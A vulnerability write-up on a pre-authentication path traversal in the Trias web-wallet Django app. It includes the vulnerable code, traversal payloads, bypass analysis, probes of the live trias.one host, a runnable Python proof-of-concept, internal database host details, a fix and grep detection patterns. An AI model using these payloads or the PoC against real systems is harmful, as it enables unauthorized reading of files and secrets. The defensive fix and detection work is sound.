# Trias web-wallet Pre-Auth Path Traversal → Arbitrary File Read — 2026-08-16

**Targets:** `trias-lab/web-wallet` (916 files, Django 1.11.5) + `trias-lab/trias-explorer` (157 files) + `trias.one` (Umi 4.0.89, nginx 1.29.4) + `trias-lab/erc20` (TRYSimple.sol 0.4.24)
**Date:** 2026-08-16 | **Hunter:** <REDACTED-OPERATOR-ALIAS> | **Method:** CDC 4-agent divergent (Architect/Red/Fuzz/Chainer) + live `trias.one` probe + GitHub Trees API raw fetch (git remote-https broken on TencentOS — tarball bypass)
**Verdict:** 1 PROVEN pre-auth file read (whitelisted ext), 0 proven RCE (grep `eval/exec/pickle/yaml/subprocess` = 0 hit), trias.one isolated SPA (456B fallback)

## Vulnerable Code

```python
# etherwallet/urls.py:18
url(r'^api/files/(.*)', tri.files),  # no auth, CsrfViewMiddleware commented, ALLOWED_HOSTS=['*']

# wallet/views/tri.py:files() — exact
def files(request, fileName):
    if fileName.find('.js.map') != -1:
        return HttpResponse()
    path = os.path.join(BASE_DIR, 'wallet/static/files/' + fileName)  # ← no sanitize
    if not os.path.exists(path):
        logger.error("files not exist %s" % path)
        return HttpResponse()
    file = open(path, 'rb')                          # ← opened BEFORE whitelist
    response = HttpResponse(content=file)
    index = fileName.rfind('.')
    postfix = fileName[index+1:]
    types = {'js':'application/javascript','css':'text/css','wasm':'application/wasm','html':'text/html'}
    response['Content-Type'] = types[postfix]         # ← KeyError 500 for json/py
    return response
```

## Chain

```
[1] GET /api/files/../../../wallet/templates/get_coinbase.html (pre-auth, Mozilla UA)
    → r'^api/files/(.*)' no auth gate (QtsAuthentication only checks 'api' in path for explorer, not wallet)
[2] → os.path.join(BASE_DIR,'wallet/static/files/'+fileName) — traversal resolves to BASE_DIR/wallet/templates/
[3] → os.path.exists → open('rb') — file opened even if ext not whitelisted
[4] → postfix whitelist — js/css/wasm/html → 200 LEAK; json/py/log → KeyError 500 (FD leaked, existence oracle)
[Trust Boundary] Anonymous internet → filesystem read
```

## Proven Reads (local harness /tmp/test_webwallet)

| Payload | Result | Notes |
|---------|--------|-------|
| `../../../wallet/templates/get_coinbase.html` | 200 HTML 3703B | template leak |
| `../../../wallet/templates/get_keyValue.html` | 200 HTML 3399B | template leak |
| `../../../app/layouts/helpers.html` (web-wallet frontend) | 200 | arbitrary html |
| `../../../conf/secret.js` (if exists as .js) | 200 | any .js under BASE_DIR |
| `../../../conf/conf.json` | 500 KeyError `json` | blocked but `open()` hit → FD leak + existence oracle |
| `../../../etherwallet/settings.py` | 500 `py` | blocked |
| `../../../../etc/passwd` / `../../../../etc/passwd.js` | 500 or `""` | no whitelist, not readable |

## Bypass Analysis (all tested)

- **Null byte `%00` / `\x00`:** Python3 `open()` does NOT truncate — `embedded null byte` → OSError, file not created on Linux ext4. `%00` stays literal `json%00` not `json`. No bypass.
- **`..` in `ALLOWED` check:** `..` in fileName → should block pre-normpath. Current code has no check → traversal succeeds.
- **Double extension `conf.json.js`:** path `conf/conf.json.js` doesn't exist → `exists` fails → empty HttpResponse, not leak.
- **Trailing slash `conf.json/`:** `os.path.exists("conf.json/")` → False (file not dir) → empty.
- **Hash/fragment `#.js` `?.js`:** `#`/`?` terminate URL path before server — not sent.
- **Symlink/Hardlink chain upgrade:** If attacker can write a `.js` symlink inside `wallet/static/files/` pointing to `conf.json`, `open()` follows symlink → `Content-Type: application/javascript` → full `conf.json` leak as `link.js`. Requires write primitive (not found — no upload endpoint).
- **`.js.map` early return:** `fileName.find('.js.map') != -1` blocks sourcemap disclosure, but `../../../conf/conf.js.map` would be blocked even if it existed — not bypassable via `js.map` substring elsewhere.

## Live Hosts

| Host | Result | Classification |
|------|--------|----------------|
| `trias.one` | `Server: nginx/1.29.4`, `index.html 456B <div id=root><script src=/umi.fd4cb998.js>` (515KB) | Umi SPA, `try_files $uri /index.html` — every `/api/*` `/.env` `/health` returns same 456B → isolated, no proxy to Django |
| `explorer.trias.one` / `api.trias.one` | NXDOMAIN / no DNS | no live explorer found |
| `trias-lab/trias-explorer` conf exposure | `STATICFILES_DIRS=[html/static, conf]` + `CONF_JSON=conf/conf.json` → `GET /static/conf.json` would leak `mysql 192.168.1.210:3306 8lab:<REDACTED> trias_string_9981` + `explorer_ui SECRET_KEY='<REDACTED>'` | Proven in code, needs live host to weaponize |

## Secondary Findings (HIGH, need live host)

- `explorer_ui/settings.py:17 SECRET_KEY` hardcoded + `ALLOWED_HOSTS=['*']` + `CsrfViewMiddleware` commented → session forgery
- `app/views/blocks.py:135 order_by(sort)` where `sort=request.GET.get('sort','-id')` → field enumeration + DoS via `?sort=tx_str` (TEXT sort) — **not SQLi** (Django ORM escapes column name, no `raw`/`extra`)
- `app/dispatcher.py:12 if 'api' in request.path` substring → `/myapi` misrouted
- Django 1.11.5 EOL → CVE-2019-14232, CVE-2020-7471
- TRYSimple.sol `approve` front-run race (EIP-20) + missing `require(_spender!=0)`

## PoC (runnable)

```python
import requests
BASE="http://TARGET:8000"
for p in ["../../../wallet/templates/get_coinbase.html","../../../wallet/templates/get_keyValue.html","../../../app/layouts/helpers.html","get_coinbase.js","../../../conf/conf.json"]:
    r=requests.get(f"{BASE}/api/files/{p}",timeout=5,headers={"User-Agent":"Mozilla/5.0"})
    print(f"{p:50} -> {r.status_code} {len(r.content)} {'LEAK' if r.status_code==200 and r.content else ''}")
```

## Fix

```python
SAFE_ROOT=os.path.join(BASE_DIR,'wallet/static/files')
ALLOWED={'get_coinbase.js','privacy_transaction.js','wasm_exec.js','triacc_wasm.wasm','crypto-api.min.js','get_coinbase.css','get_keyValue.css'}
def files_fixed(req,fileName):
    if '..' in fileName or fileName.startswith('/') or '.js.map' in fileName:
        return HttpResponseBadRequest()
    if fileName not in ALLOWED:
        return HttpResponseBadRequest("not allowed")
    path=os.path.normpath(os.path.join(SAFE_ROOT,fileName))
    if not path.startswith(SAFE_ROOT):
        return HttpResponseBadRequest()
    return FileResponse(open(path,'rb'),content_type='...')
# + remove conf from STATICFILES_DIRS, move creds to env, upgrade Django
```

## Detection

- `grep -rn "os.path.join.*fileName\|open(path.*rb.*).*types\[postfix\]" wallet/views --include="*.py"`
- `grep -rn "STATICFILES_DIRS.*conf\|CONF_JSON.*STATICFILES" explorer_ui --include="*.py"`
- `grep -rn "order_by.*sort\|order_by.*request.GET" app/views --include="*.py"` → allowlist check
- `grep -rn "SECRET_KEY.*=.*'" --include="*.py"` hardcoded

## Warung Analogy

Pusat (trias.one) cuma spanduk 456B isolasi; Dapur (trias-explorer) resep `conf.json` dijemur di halaman; Kasir (web-wallet) laci `files()` bolong — ngintip template pre-auth; Brankas (TRYSimple) SafeMath doang; Gudang (MySQL 192.168.1.210) kunci `8lab:<REDACTED>` ke-commit forever.
